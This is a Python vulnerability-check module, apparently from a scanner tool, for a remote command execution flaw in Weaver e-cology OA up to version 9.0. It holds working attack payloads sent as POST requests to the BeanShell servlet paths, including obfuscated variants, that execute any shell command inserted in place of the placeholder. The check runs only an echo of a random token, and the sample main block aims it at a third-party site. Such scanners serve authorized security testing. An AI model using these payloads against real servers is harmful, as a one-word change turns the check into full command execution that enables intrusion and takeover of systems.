#/usr/bin/python3

from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class Weaver_Ecology_Oa_Rce_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': '泛微-OA漏洞可执行任意命令',
            'description': '泛微-OA漏洞可执行任意命令,影响范围为: 泛微 e-cology <=9.0',
            'date': '2019-09-19',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.capta = get_capta() 
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        self.url_payloads = ["/bsh.servlet.BshServlet", "/weaver/bsh.servlet.BshServlet", "/weaveroa/bsh.servlet.BshServlet", "/oa/bsh.servlet.BshServlet"]
        self.data_payloads = ["""bsh.script=exec("{cmd}");&bsh.servlet.output=raw""", """bsh.script=\u0065\u0078\u0065\u0063("{cmd}");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw""", """bsh.script=eval%00("ex"%2b"ec(bsh.httpServletRequest.getParameter(\\"command\\"))");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command={cmd}"""]
       
    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        for url_payload in self.url_payloads:
            url = self.url + url_payload
            for data_payload in self.data_payloads: 
                try:
                    check_req = await request.post(url, data = data_payload.format(cmd = 'echo ' + self.capta), headers = self.headers)
                    if check_req.status == 200 and ";</script>" not in check_req.content and "Login.jsp" not in check_req.content and "Error" not in check_req.content and self.capta in check_req.content:
                        # print("存在E-cologyOA_RCE漏洞")
                        #print("Server Current Username：{0}".format(check_req.content))
                        return True, url_payload, data_payload
                except Exception as e:
                    # print(e)
                    pass

if __name__ == '__main__':
    Weaver_Ecology_OA_Rce = Weaver_Ecology_Oa_Rce_BaseVerify('https://www.baidu.com')
    Weaver_Ecology_OA_Rce.check()